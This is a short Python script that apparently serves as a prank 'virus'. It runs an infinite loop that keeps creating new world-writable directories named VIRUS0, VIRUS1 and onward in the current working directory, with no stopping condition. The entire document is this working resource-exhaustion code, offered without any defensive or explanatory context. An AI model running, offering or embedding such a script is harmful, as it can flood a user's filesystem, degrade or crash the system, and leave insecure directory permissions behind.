from os import getcwd, mkdir

i = 0
while True:
    ruta = getcwd()
    mkdir(f"{ruta}/VIRUS{i}", mode=0o777)  
    i += 1